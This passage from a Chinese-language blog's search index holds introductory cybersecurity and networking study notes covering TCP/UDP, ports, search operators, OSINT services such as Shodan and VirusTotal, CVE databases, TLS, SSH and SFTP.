Cookie。\n打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png","permalink":"https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"HTTP 详细信息"},{"content":"数据包和帧 什么是数据包和帧 数据包和帧是小块数据，当它们组合在一起时，会形成较大的信息或消息。但是，它们在 OSI 模型中是两个不同的东西。帧位于第 2 层 - 数据链路层，这意味着没有 IP 地址等信息。将此视为将信封放入信封中并将其寄走。第一个信封将是您邮寄的数据包，但一旦打开，其中的信封仍然存在并包含数据（这是一个帧）。\n这个过程称为封装，我们在 3 号房间中讨论过：OSI 模型 。在这个阶段，可以安全地假设当我们谈论任何 IP 地址时，我们谈论的是数据包。当封装信息被剥离时，我们谈论的是框架本身。\n数据包是在联网设备之间传输数据的一种有效方式，例如任务 1 中介绍的设备。由于这些数据是小块交换的，因此与一次发送大消息相比，整个网络中出现瓶颈的可能性更小。\n例如，从网站加载图像时，此图像不会作为一个整体发送到您的计算机，而是在您的计算机上重建的小块。以下图为例来说明这个过程。猫咪的照片被分成三个包，到达计算机后被重建，形成最终的图像。\n数据包具有不同的结构，具体取决于要发送的数据包的类型。正如我们接下来将要讨论的那样，网络充满了标准和协议，它们充当了一组规则，用于定义如何在设备上处理数据包。互联网上连接了数十亿台设备，如果没有标准化，事情可能会很快崩溃。\n让我们继续我们的 Internet 协议示例。使用此协议的数据包将具有一组标头，其中包含通过网络发送的数据的附加信息。\n一些值得注意的标头包括：\nHeader 页眉 Description 描述 Time to Live 此字段为数据包设置一个到期计时器，如果它从未设法到达主机或逃逸，则不会阻塞您的网络！ Checksum 此字段为 TCP/IP 等协议提供完整性检查。如果更改了任何数据，此值将与预期值不同，因此会损坏。 Source Address 发送 数据包的设备的 IP 地址，以便数据知道要返回到何处。 Destination Address 数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。 TCP/IP 三次握手 TCP （或 简称 Transmission Control Protocol）是网络中使用的另一种规则。\n到目前为止，该协议与我们之前在本模块的 3 号房间中讨论的 OSI 模型非常相似。TCP/IP 协议由四层组成，可以说只是 OSI 模型的概括版本。这些层是：\nApplication 应用 Transport 运输 Internet 互联网 Network Interface 网络接口 与 OSI 模型的工作方式非常相似，当数据（或数据包）遍历 TCP 模型时，信息会添加到 TCP 模型的每一层。您可能还记得，这个过程被称为 encapsulation - 这个过程的反面是 decapsulation。\nTCP 的一个定义特征是它是 基于连接的 ，这意味着 TCP 必须在发送数据之前在客户端和充当服务器的 设备之间建立连接 。\n因此，TCP 保证发送的任何数据都将在另一端接收。这个过程被称为 三次握手，我们稍后会讨论。 下表比较了 TCP 的优缺点：\nTCP 的优点 TCP 的缺点 保证数据的完整性。 需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块，必须重新发送。 能够同步两个设备，以防止彼此以错误的顺序被数据淹没。 慢速连接可能会使另一台设备成为瓶颈，因为该连接将始终保留在另一台设备上。 执行更多的流程以实现可靠性 TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多的工作 （计算）。 TCP 数据包包含从封装添加的称为报头的信息的各个部分。让我们解释下表中的一些关键标头：\nHeader 页眉 Description 描述 Source Port 源端口 此值是发送方打开的用于发送 TCP 数据包的端口。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。 Destination Port 目标端口 此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。 Source IP 源 IP 这是发送数据包的设备的 IP 地址。 Destination IP 目标 IP 这是数据包的目标设备的 IP 地址。 Sequence Number 序列号 当连接发生时，传输的第一条数据被赋予一个随机数。我们将在后面更深入地解释这一点。 Acknowledgement Number 鸣谢编号 为一条数据指定序列号后，下一条数据的编号将具有序列号 + 1。我们还将进一步更深入地解释这一点。 Checksum 校验和 此值提供 TCP 完整性。在记住输出的地方进行数学计算。当接收设备执行数学计算时，如果输出与发送的内容不同，则数据必须损坏。 Data 数据 此标头是存储数据（即正在传输的文件的字节）的位置。 Flag 旗 此标头确定任一设备在握手过程中应如何处理数据包。特定的标志将决定特定的行为，这就是我们将在下面解释的内容。 接下来，我们将继续讨论三方握手 - 该术语用于在两个设备之间建立连接的过程。 三方握手使用一些特殊消息进行通信 - 下表突出显示了主要消息：\n步骤 消息 描述 1 SYN SYN 消息是客户端在握手期间发送的初始数据包。此数据包用于启动连接并将两个设备同步在一起（我们稍后将进一步解释）。 2 SYN/ACK 此数据包由接收设备（服务器）发送，以确认来自客户端的同步尝试。 3 ACK The acknowledgement packet can be used by either the client or server to acknowledge that a series of messages/packets have been successfully received. 客户端或服务器可以使用确认数据包来确认已成功接收一系列消息/数据包。 4 DATA 建立连接后，数据（例如文件的字节）将通过 “DATA” 消息发送。 5 FIN 此数据包用于在连接完成后干净（正确） 关闭连接。 # RST 此数据包会突然结束所有通信。这是最后的手段，表明在此过程中存在一些问题。例如，如果服务或应用程序无法正常工作，或者系统存在资源不足等故障。 下图显示了 Alice 和 Bob 之间的正常 Three-way 握手过程。在现实生活中，这将是在两个设备之间。\n任何发送的数据都会被赋予一个随机数字序列，并使用此数字序列并以 1 为增量进行重建。两台计算机必须就相同的编号规则达成一致，才能以正确的顺序发送数据。此顺序分三个步骤达成一致：\nSYN - 客户端：这是我的初始序列号 （ISN），用于 SYNchronise （0） SYN/ACK - 服务器：这是我用 （5,000） 记录 SYN 的初始序列号 （ISN），我现在确认您的初始编号序列 （0） ACK - 客户端：我确认您的初始序列号 （ISN） 为 （5,000），下面是我的 ISN+1 （0 + 1） 的一些数据 Device 初始编号序列 （ISN） 最终编号序列 客户端 （发件人） 0 0 + 1 = 1 客户端 （发件人） 1 1 + 1 = 2 客户端 （发件人） 2 2 + 1 = 3 TCP 协议关闭连接：\n让我们快速解释一下 TCP 关闭连接背后的过程。首先， 一旦设备确定另一台设备已成功接收所有数据，TCP 将关闭连接。\n由于 TCP 会在设备上保留系统资源，因此最佳做法是尽快关闭 TCP 连接。\n要启动关闭 TCP 连接，设备将向另一台设备发送 “FIN” 数据包。当然，使用 TCP 时，另一台设备也必须确认此数据包。\n让我们像以前一样使用 Alice 和 Bob 来演示这个过程。\n在图中，我们可以看到 Alice 向 Bob 发送了一个 “FIN” 数据包。因为 Bob 收到了这个，所以他会让 Alice 知道他收到了这个，并且他还想关闭连接（使用 FIN）。Alice 已经清楚地听到了 Bob 的声音，并会让 Bob 知道她承认了这一点。\nUDP/IP 协议 User Datagram Protocol （UDP） 是另一种用于在设备之间传输数据的协议。\n与其兄弟 TCP 不同，UDP 是一种 无 状态协议，不需要两个设备之间持续连接即可发送数据。例如，不会发生 Three-way hand shake，两个设备之间也没有任何同步。\n回想一下 3 号房间中对这两个协议所做的一些比较：“OSI 模型”。也就是说，UDP 用于应用程序可以容忍数据丢失的情况（例如视频流或语音聊天）或不稳定的连接不是最终结果的情况。下表比较了 UDP 的优缺点：\nUDP 的优势 UDP 的缺点 UDP 比 TCP 快得多。 UDP 不关心数据是否被接收。 UDP 让应用程序（用户软件）决定是否可以控制数据包的发送速度。 从这个意义上说，它对软件开发人员来说是相当灵活的。 UDP 不会像 TCP 那样在设备上保留连续连接。 这意味着不稳定的连接会给用户带来糟糕的体验。 如前所述，在两个设备之间建立连接时不会发生任何过程。这意味着不考虑是否接收数据，也没有像 TCP 提供的保护措施，例如数据完整性。\nUDP 数据包比 TCP 数据包简单得多，并且标头更少。但是，这两种协议共享一些标准标头，下表中对此进行了注释：\nHeader 页眉 描述 Time to Live (TTL) 生存时间 （TTL） 此字段为数据包设置到期计时器，因此如果数据包从未成功到达主机或逃逸，它不会阻塞您的网络！ Source Address 源地址 发送数据包的设备的 IP 地址，以便数据知道要返回到何处。 Destination Address 目标地址 数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。 Source Port 源端口 此值是发送方打开的端口，用于发送 UDP 数据包。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。 Destination Port 目标端口 此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。 Data 数据 此标头是存储数据（即正在传输的文件的字节）的位置。 接下来，我们将继续讨论通过 UDP 进行连接的过程与 TCP 等过程有何不同。 我们应该记住 UDP 是无状态的。连接期间不会发送确认。\n下图显示了 Alice 和 Bob 之间的正常 UDP 连接。在现实生活中，这将是在两个设备之间。\n端口 也许正如他们的名字一样，端口是可以交换数据的重要点。想想港口和港口。希望停靠港口的船舶必须前往与船上的尺寸和设施相适应的港口。当船只排队时，它将连接到港口的港口 。例如，邮轮不能停靠在为渔船建造的港口，反之亦然。\n这些端口强制规定了什么可以停放以及停在哪里——如果不兼容，它就不能停在这里。网络设备在相互通信时也使用端口来执行严格的规则。建立连接后（从 OSI 模型的房间调用），设备发送或接收的任何数据都将通过这些端口发送。在计算中，端口是介于 0 和 65535 （65,535） 之间的 数值 。\n由于端口的范围可以在 0 到 65535 之间的任何位置，因此很快就会忘记哪个应用程序正在使用哪个端口。繁忙的港口一片混乱！值得庆幸的是，我们将应用程序、软件和行为与一组标准规则相关联。例如，通过强制通过端口 80 发送任何 Web 浏览器数据，软件开发人员可以设计一个 Web 浏览器（如 Google Chrome 或 Firefox）来以相同的方式解释数据。\n这意味着所有 Web 浏览器现在都共享一个通用规则：数据通过端口 80 发送。浏览器的外观、感觉和易用性取决于设计师或用户的决定。\n虽然 Web 数据的标准规则是 端口 80，但已为其他一些协议分配了标准规则。介于 0 和 1024 （1,024） 之间的 任何端口都称为公共端口。 让我们在下面探索一些其他协议：\nProtocol 协议 端口号 描述 File Transfer Protocol (FTP) 21 此协议由基于客户端-服务器模型构建的文件共享应用程序使用，这意味着您可以从中心位置下载文件。 Secure Shell (SSH) 22 该协议用于通过基于文本的界面安全地登录系统以进行管理。 HyperText Transfer Protocol (HTTP) 80 该协议为万维网 （WWW） 提供支持！您的浏览器使用它来下载网页的文本、图像和视频。 HyperText Transfer Protocol Secure (HTTPS) 443 该协议的作用与上述完全相同;但是，安全地使用加密。 Server Message Block (SMB) 445 此协议类似于文件传输协议 （FTP）;但是，除了文件之外，SMB 还允许您共享打印机等设备。 Remote Desktop Protocol (RDP) 3389 此协议是一种使用可视化桌面界面登录系统的安全方法（与 SSH 协议的基于文本的限制相反）。 我们只简要介绍了网络安全中更常见的协议。有关更多信息，您可以找到列出的 1024 个常用端口的表 。\n这里值得注意的是，这些协议只遵循标准。即，您可以在标准端口以外的其他端口（在 8080 而不是 80 标准端口上运行 Web 服务器）上管理与这些协议交互的应用程序。但请注意，应用程序将假定遵循标准，因此您必须提供冒号 （:) 以及端口号。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-9239059_1280.jpg","permalink":"https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/","title":"数据包和帧"},{"content":"搜索技巧 搜索引擎 我们每个人都使用过互联网搜索引擎;但是，并不是每个人都尝试利用 Internet 搜索引擎的全部功能。几乎每个 Internet 搜索引擎都允许您进行高级搜索。请考虑以下示例：\nGoogle 谷歌 Bing 必应 DuckDuckGo 鸭鸭 Go 让我们考虑一下 Google 支持的搜索运算符。\n\u0026quot;exact phrase\u0026quot;：双引号表示您正在查找包含确切单词或短语的页面。例如，人们可能会搜索 “passive reconnaissance” 来获取包含此确切短语的页面。 site:： 此运算符允许您指定要将搜索限制到的域名。例如，我们可以使用 在 TryHackMe 上搜索 site:tryhackme.com success stories 成功案例。 -：减号允许您省略包含特定单词或短语的搜索结果。例如，您可能对了解金字塔感兴趣，但不想查看旅游网站;一种方法是搜索 pyramids -tourism 或 -tourism pyramids。 filetype:： 此搜索运算符对于查找文件而不是网页是必不可少的。您可以使用 Google 搜索的一些文件类型是可移植文档格式 （PDF）、Microsoft Word 文档 （DOC）、Microsoft Excel 电子表格 （XLS） 和 Microsoft PowerPoint 演示文稿 （PPT）。例如，要查找网络安全演示文稿，请尝试搜索 filetype：ppt cyber security。 您可以在此高级搜索运算符列表中查看各种搜索引擎中的更高级控件;但是，以上提供了一个很好的起点。检查您最喜欢的搜索引擎，了解支持的搜索运算符。\n序号 语法 语法说明 示例 示例说明 1 + 同AND，搜索包含多个关键词的结果 搜索 + 引擎 搜索包含【搜索】和【引擎】两个词的页面 2 OR 或者 搜索 OR 引擎 搜索包含【搜索】或【引擎】两个词的页面 3 - 减号，不包含减号后面词的页面 搜索引擎 -百度 搜索不包括【百度】的【搜索引擎】的页面 4 “” 双引号，精确匹配 “搜索引擎” 精确匹配【搜索引擎】这个关键词的页面 5 ***** 星号，通配符，模糊搜索，星号代替某个字 搜*引擎 星号可以为任何字 6 @ 在用于搜索社交媒体的字词前加上@ trump @twitter 搜索trump的twitter 7 $ 在数字前加上$搜索特定价格 camera $400 搜索400$的camera 8 # 搜索 # 标签 #throwbackthursday 搜索标签throwbackthursday 9 .. 两个点，在两个数字之间加上.. 在数字范围内执行搜索 camera 500..1000 搜索500−1000的camera 10 filetype 搜索某一种文件类型的资源 C++ filetype:pdf 搜索类型为pdf的C++网页资源 11 site 在指定站点搜索 C++ site:https://www.zhihu.com 在知乎中搜索和C++相关的网页 12 cache 查看网站的 Google 缓存版本，会直接显示缓存页面 cache:weibo.com 查看微博的谷歌快照 13 info 在网址前加info:，获取网站详情 info:github.com 搜索github网站详情 14 related 搜索与某个网站有关联的页面 related:sina.com 和新浪网网站结构内容相似的一些其它网站 15 link 返回所有链接到某个URL地址的网页 link:www.csdn.net 搜索所有含指向【www.csdn.net】链接的网页 16 inurl 搜索查询词出现在url 中的页面 inurl:搜索引擎 搜索链接url中有【搜索引擎】的网页 17 intitle 搜索查询词出现在页面标题(title)中的页面，支持中文和英文 intitle:搜索引擎 搜索页面标题中有【搜索引擎】的网页 18 intext 搜索查询词出现在页面正文(title)中的页面，支持中文和英文 SEO intext:搜索引擎 在正文包含【搜索引擎】的网页中搜索【SEO】 19 inanchor 搜索链接锚文字(即链接显示的文字)中包含搜索词的页面 inanchor:前端 搜索链接锚文字中包含【前端】的页面 20 allinurl 即all+inurl 页面url中包含多个关键词的页面 allinurl:SEO 搜索引擎优化 相当于 ：inurl:SEO inurl:搜索引擎优化 21 allintitle 即all+intitle 页面标题中包含多个关键词的页面 allintitle:SEO 搜索引擎优化 相当于：intitle:SEO intitle:搜索引擎优化 22 allintext 即all+inanchor 页面正文包含多个关键词的页面 allintext:SEO 搜索引擎优化 相当于：intext:SEO intext:搜索引擎优化 23 allinanchor 即all+inanchor 页面链接锚文字包含多个关键词的页面 allinanchor:SEO 搜索引擎优化 相当于：inanchor:SEO inanchor:搜索引擎优化 24 weather weather/time/sunrise/sundown+城市名，返回城市的天气/时间/日出时间/日落时间 weather:beijing 显示北京的天气 25 music 或者用songs，歌手名字+music/songs 周杰伦 music 返回周杰伦的各首歌曲 专业搜索引擎 您熟悉 Internet 搜索引擎;但是，您对专业搜索引擎熟悉多少？我们指的是用于查找特定类型结果的搜索引擎。\nShodan 让我们从 Shodan 开始，这是一个用于连接到 Internet 的设备的搜索引擎。它允许您搜索特定类型和版本的服务器、网络设备、工业控制系统和 IoT 设备。您可能希望查看仍有多少服务器仍在运行 Apache 2.4.1 以及各个国家/地区的分布情况。要找到答案，我们可以搜索 apache 2.4.1，它将返回标头中包含字符串“apache 2.4.1”的服务器列表。\n考虑访问 Shodan Search Query Examples 了解更多示例。此外，如果您有订阅，您可以查看 Shodan 趋势以获取历史见解。\nCensys 乍一看，Censys 似乎与 Shodan 相似。但是，Shodan 专注于连接互联网的设备和系统，例如服务器、路由器、网络摄像头和 IoT 设备。另一方面，Censys 专注于连接 Internet 的主机、网站、证书和其他 Internet 资产。它的一些用例包括枚举正在使用的域、审计开放端口和服务以及发现网络中的流氓资产。您可能需要检查 Censys Search Use Cases。\nVirusTotal VirusTotal 是一个在线网站，它使用多个防病毒引擎为文件提供病毒扫描服务。它允许用户上传文件或提供 URL，以便在一次作中针对众多防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希值来检查以前上传的文件的结果。\n下面的屏幕截图显示了根据 67 个防病毒引擎检查提交的文件的结果。此外，您可以查看社区的评论以获得更多见解。有时，文件可能会被标记为病毒或特洛伊木马程序;但是，由于各种原因，这可能不准确，这时社区成员可以提供更深入的解释。\nHave I Been Pwned Have I Been Pwned （HIBP） 只做一件事;它会告诉您电子邮件地址是否出现在数据泄露事件中。在泄露的数据中找到一个人的电子邮件表明私人信息泄露，更重要的是，密码泄露。许多用户在多个平台上使用相同的密码，如果一个平台被泄露，他们在其他平台上的密码也会暴露。事实上，密码通常以加密格式存储;但是，许多密码并不那么复杂，可以使用各种攻击来恢复。\n漏洞和漏洞利用 CVE 漏洞 我们可以将 Common Vulnerabilities and Exposures （CVE） 程序视为漏洞字典。它为软件和硬件产品中的漏洞和安全问题提供标准化标识符。每个漏洞都分配有一个采用标准化格式（如 CVE-2024-29988）的 CVE ID。此唯一标识符 （CVE ID） 可确保从安全研究人员到供应商和 IT 专业人员的每个人都引用相同的漏洞，在本例中为 CVE-2024-29988。\nMITRE Corporation 维护 CVE 系统。有关更多信息和搜索现有 CVE，请访问 CVE 计划 Web 站点。或者，访问国家漏洞数据库 （NVD） 网站。下面的屏幕截图显示了 CVE-2014-0160，也称为 Heartbleed。\n漏洞利用数据库 您想要利用易受攻击的应用程序的原因有很多;一种是将公司的安全性作为其红队的一部分进行评估。不用说，除非我们得到许可，否则我们不应该试图利用易受攻击的系统，通常是通过具有法律约束力的协议。\n现在我们有权利用易受攻击的系统，我们可能需要找到一个有效的漏洞利用代码。一种资源是 Exploit Database。漏洞利用数据库列出了来自不同作者的漏洞利用代码;其中一些漏洞利用代码已经过测试并标记为已验证。\nGitHub 是一个基于 Web 的软件开发平台，可以包含许多与 CVE 相关的工具，以及概念验证 （PoC） 和漏洞利用代码。要演示此想法，请查看下面的 GitHub 上与 Heartbleed 漏洞相关的搜索结果的屏幕截图。\n技术文档 需要获得的一项重要技能是查找官方文件。我们将介绍一些官方文档页面的示例。\nLinux 的手册页 早在 Internet 无处不在之前，您如何在 Linux 或类似 Unix 的系统中使用命令获得帮助？答案是检查手册页，简称手册页。在 Linux 和每个类 Unix 系统上，每个命令都应该有一个手册页。事实上，还存在用于系统调用、库函数甚至配置文件的手册页。\n假设我们想检查命令 ip 的手册页。我们发出命令 man ip。下面的屏幕截图显示了我们收到的页面。您可能希望启动 AttackBox 并在终端上运行 man ip。按 q 退出。\n如果您更喜欢在 Web 浏览器中阅读 ip 的手册页，只需在您最喜欢的搜索引擎中输入 man ip 即可。 此页面可能位于结果的顶部。\nMicrosoft Windows Microsoft 为其产品提供了官方技术文档页面。下面的屏幕截图显示了命令 ipconfig 的搜索结果。\n产品文档 每个流行的产品都应该有组织良好的文档。本文档提供了有关产品特性和功能的官方可靠信息来源。示例包括 Snort 官方文档 、Apache HTTP 服务器文档 、PHP 文档和 Node.js 文档 。\n查看官方文档总是有益的，因为它是最新的并提供最完整的产品信息。\n社交媒体 有数十亿用户在 Facebook、Twitter 和 LinkedIn 等社交媒体平台上注册。我们希望您熟悉流行的平台。但是，如果您知道任何不熟悉的平台，我们建议您查看并了解它。理想情况下，人们希望在不创建帐户的情况下探索平台;但是，这会严重限制您的体验。相反，一个建议是使用临时电子邮件地址来发现这些平台，而无需将它们链接到您的真实电子邮件地址;完成后，您可以终止账户和关联的电子邮件地址。不使用您的主要帐户的一个原因是，当您只是暂时探索平台时，您不希望您的联系人开始在那里与您联系。\n社交媒体的力量在于它可以让您与您感兴趣的公司和人建立联系。此外，社交媒体为网络安全专业人士提供了丰富的信息，无论他们是搜索人员还是技术信息。你会问为什么搜索人很重要？\n在保护公司时，您应该确保您保护的人不会在社交媒体上过度分享。例如，他们的社交媒体可能会泄露他们秘密问题的答案，例如，“你小时候上过哪所学校？此类信息可能允许攻击者重置其密码并轻松接管其帐户。\n此外，作为网络安全专业人士，您希望随时了解新的网络安全趋势、技术和产品。遵循适当的渠道和小组可以为增长您的技术专业知识提供合适的环境。\n除了通过社交媒体渠道和群组保持更新外，我们还应该提及新闻媒体。数百个新闻网站将提供有价值的网络安全相关新闻。尝试不同的，并坚持你最喜欢的。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-9438277.jpg","permalink":"https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/","title":"搜索技巧"},{"content":"TLS 在某一时刻，您只需要一个数据包捕获工具来读取网络上用户的所有聊天、电子邮件和密码。攻击者将其网卡设置为混杂模式的情况并不少见，即捕获所有数据包，包括那些不是发往它的数据包。他们稍后会检查所有数据包捕获并获取毫无戒心的受害者的登录凭据。用户无法采取任何措施来阻止其登录密码以明文形式发送。如今，以明文形式发送登录凭据的服务已经很少见。\n在 1990 年代初期，Netscape Communications 认识到在万维网上进行安全通信的必要性。他们最终开发了 SSL（安全套接字层），并于 1995 年发布了 SSL 2.0 作为第一个公共版本。1999 年，Internet 工程任务组 （IETF） 开发了 TLS（传输层安全性）。虽然非常相似，但 TLS 1.0 是 SSL 3.0 的升级版，并提供了各种改进的安全措施。2018 年，TLS 对其协议进行了重大改革，并发布了 TLS 1.3。目的不是记住确切的日期，而是实现开发当前版本的 TLS（即 TLS 1.3）所投入的工作量和时间。二十多年来，每个版本都有很多东西需要学习和改进。\n与其前身 SSL 一样，TLS 是一种在 OSI 模型的传输层运行的加密协议。它允许客户端和服务器之间通过不安全的网络进行安全通信。我们所说的安全是指机密性和完整性;TLS 确保没有人可以读取或修改交换的数据。请花点时间想一想，如果在网上购物、网上银行，甚至在线消息和电子邮件，而无法保证网络数据包的机密性和完整性，那会是什么样子。如果没有 TLS，我们将无法使用 Internet 来处理许多应用程序，这些应用程序现在已成为我们日常生活的一部分。\n如今，数十种协议已经通过简单地添加 TLS 进行了安全升级。示例包括 HTTP、DNS、MQTT 和 SIP，它们已成为 HTTPS、DoT（DNS over TLS）、MQTTS 和 SIPS，其中附加的“S”由于使用了 SSL/TLS，代表安全。在以下任务中，我们将访问 HTTPS、SMTPS、POP3S 和 IMAPS。\n技术背景 我们不会讨论 TLS 握手;但是，如果您好奇，可以查看网络安全协议室。我们将简要介绍如何设置和使用 TLS。\n对于每个需要标识自身的服务器（或客户端），第一步是获取签名的 TLS 证书。通常，服务器管理员会创建证书签名请求 （CSR） 并将其提交给证书颁发机构 （CA）;CA 验证 CSR 并颁发数字证书。收到（签名的）证书后，可以使用它向其他人识别服务器（或客户端），这些人可以确认签名的有效性。为了让主机确认签名证书的有效性，需要在主机上安装签名机构的证书。在非数字世界中，这类似于识别各种权威机构的邮票。下面的屏幕截图显示了 Web 浏览器中安装的受信任颁发机构。\n一般来说，签署证书需要支付年费。但是，Let\u0026rsquo;s Encrypt 允许您免费签署您的证书。\n最后，我们应该提到一些用户选择创建自签名证书。自签名证书无法证明服务器的真实性，因为没有第三方确认它。\nHTTPS协议 正如我们在 Networking Core Protocols 房间里所研究的那样，HTTP 依赖于 TCP，并默认使用端口 80。我们还看到了所有 HTTP 流量如何以明文形式发送，供任何人拦截和监控。下面的屏幕截图来自上一个房间，它清楚地说明了对手如何轻松读取客户端和服务器之间交换的所有流量。\n让我们花点时间回顾一下 Web 浏览器可以通过 HTTP 请求页面之前的最常见步骤。将域名解析为 IP 地址后，客户端将执行以下两个步骤：\n与目标服务器建立 TCP 三次握手 使用 HTTP 协议进行通信;例如，发出 HTTP 请求，例如 GET / HTTP/1.1 上述两个步骤显示在下面的窗口中。TCP 握手的三个数据包（标有 1）位于第一个包含 GET 的 HTTP 数据包之前。HTTP 通信标有 2。最后显示的三个数据包用于 TCP 连接终止，并标有 3。\nHTTP Over TLS HTTPS 代表安全超文本传输协议。它基本上是 HTTP over TLS。因此，通过 HTTPS 请求页面需要以下三个步骤（解析域名后）：\n与目标服务器建立 TCP 三次握手 建立 TLS 会话 使用 HTTP 协议进行通信;例如，发出 HTTP 请求，例如 GET / HTTP/1.1 下面的屏幕截图显示，在前三个数据包中建立了 TCP 会话，标记为 1。然后，交换多个数据包以协商 TLS 协议，标有 2。1 和 2 是进行 TLS 协商和建立的地方 。\n最后，在交换 HTTP 应用层数据时（图中标记为 3 的部分），Wireshark 截图中显示为 “Application Data”（应用数据），而非具体的协议名称（如 HTTP）。这是因为数据通过 443 端口（默认 HTTPS 端口）传输且经过 TLS/SSL 加密，Wireshark 无法直接解析加密后的内容，因此无法确认它是否为 HTTP 或其他协议（如 FTP over TLS）。\n正如预期的那样，如果尝试跟踪数据包流并组合其所有内容，他们只会得到乱码，如下面的屏幕截图所示。交换的流量是加密的;红色由客户端发送，蓝色由服务器发送。如果不获取加密密钥，就无法知道内容。\n获取加密密钥 将 TLS 添加到 HTTP 会导致所有数据包都被加密。除非我们获得私钥的访问权限，否则我们无法再看到交换数据包的内容。尽管我们不太可能访问 TLS 会话中用于加密的密钥，但在向 Wireshark 提供解密密钥后，我们重复了上述屏幕截图。TCP 和 TLS 握手不会更改;主要区别从标记为 3 的 HTTP 协议开始。例如，我们可以看到客户端何时发出 GET。\n如果您想看到交换的数据，现在是您的机会！它仍然是隐藏在窥探者的常规 HTTP 流量。\n核心结论：TLS（传输层安全协议）为HTTP提供了安全保障，且无需对底层（如TCP/IP）或上层协议（如HTTP）进行任何修改。具体而言：\nTCP/IP协议栈保持原状：传输层（TCP）和网络层（IP）的运作机制未改变。 HTTP的传输方式升级：原本通过TCP明文传输的HTTP数据，现改为通过TLS加密信道传输，但HTTP协议本身的结构和语法无需调整。 SMTPS,POP3S和IMAPS 将 TLS 添加到 SMTP、POP3 和 IMAP 与将 TLS 添加到 HTTP 没有什么不同。与 HTTP 获取附加的 S 表示安全并变为 HTTPS、SMTP、POP3 和 IMAP 分别变为 SMTPS、POP3S 和 IMAPS 类似。通过 TLS 使用这些协议与使用 HTTP over TLS 没有什么不同;因此，HTTPS 讨论中的几乎所有要点都适用于这些协议。\n不安全版本使用下表中所示的默认 TCP 端口号：\n协议 默认端口号 HTTP 80 SMTP 25 POP3 110 IMAP 143 默认情况下，安全版本（即通过 TLS）使用以下 TCP 端口号：\n协议 默认端口号 HTTPS 443 SMTPS 465 和 587 POP3S 995 IMAPS 993 TLS 可以添加到许多其他协议中;理由和优势是相似的。\nSSH 我们在 Networking Concepts 会议室中使用了 TELNET 协议。尽管登录和管理远程系统非常方便，但当所有流量都以明文形式发送时，风险很大。使用 telnet 后，任何监控网络流量的人都很容易获得您的登录凭据。这个问题需要一个解决方案。Tatu Ylönen 开发了安全外壳 （SSH） 协议，并于 1995 年作为免费软件发布了 SSH-1。（有趣的是，Netscape Communications 在同一年发布了 SSL 2.0 协议。1996 年定义了一个更安全的版本 SSH-2。1999 年，OpenBSD 开发人员发布了 OpenSSH，这是 SSH 的开源实现。如今，当您使用 SSH 客户端时，它很可能基于 OpenSSH 库和源代码。\nOpenSSH 有几个好处。我们将列出几个关键点：\n安全身份验证 ：除了基于密码的身份验证外，SSH 还支持公钥和双因素身份验证。 机密性 ：OpenSSH 提供端到端加密，防止窃听。此外，它还会通知您新的服务器密钥，以防止中间人攻击。 完整性 ：除了保护交换数据的机密性外，加密技术还保护流量的完整性。 隧道 ：SSH 可以创建一个安全的“隧道”，通过 SSH 路由其他协议。此设置会导致类似 VPN 的连接。 X11 转发 ：如果您连接到具有图形用户界面的类 Unix 系统，SSH 允许您通过网络使用图形应用程序。 您可以发出命令 ssh username@hostname 以连接到 SSH 服务器。如果用户名与您登录的用户名相同，则只需要 ssh hostname 。然后，系统会要求您输入密码;但是，如果使用公钥身份验证，您将立即登录。\n下面的屏幕截图显示了在远程 Kali Linux 系统上运行 Wireshark 的示例。需要参数 -X 来支持正在运行的图形界面，例如 ssh 192.168.124.148 -X。（本地系统需要安装合适的图形系统。\n当 TELNET 服务器侦听端口 23 时，SSH 服务器侦听端口 22。\nSFTP和FTPS SFTP 代表 SSH 文件传输协议，允许安全的文件传输。它是 SSH 协议套件的一部分，共享相同的端口号 22。如果在 OpenSSH 服务器配置中启用，则可以使用 sftp username@hostname 等命令进行连接。登录后，您可以发出 get filename 和 put filename 等命令来分别下载和上传文件。一般来说，SFTP 命令类似于 Unix，可能与 FTP 命令不同。\nSFTP 不应与 FTPS 混淆。您认为 FTPS 代表 File Transfer Protocol Secure 是正确的。FTPS 如何得到保护？是的，您正确地估计它是使用 TLS 保护的，就像 HTTPS 一样。FTP 使用端口 21，而 FTPS 通常使用端口 990。它需要证书设置，并且允许通过严格的防火墙可能很棘手，因为它使用单独的连接进行控制和数据传输。\n设置 SFTP 服务器就像在 OpenSSH 服务器中启用一个选项一样简单。与 HTTPS、SMTPS、POP3S、IMAPS 和其他依赖 TLS 确保安全性的协议一样，FTPS 需要适当的 TLS 证书才能安全运行。\nVPN 考虑一家在不同地理位置设有办事处的公司。该公司能否将其所有办公室和站点连接到主分支机构，以便任何设备都可以访问共享资源，就像实际位于主分支机构一样？答案是肯定的;此外，最经济的解决方案是使用 Internet 基础设施设置虚拟专用网络 （VPN）。此处的重点是 VPN 中 V 表示虚拟。\n在设计 Internet 时，TCP/IP 协议套件专注于传输数据包。例如，如果路由器停止服务，路由协议可以适应并选择不同的路由来发送其数据包。如果数据包未被确认，TCP 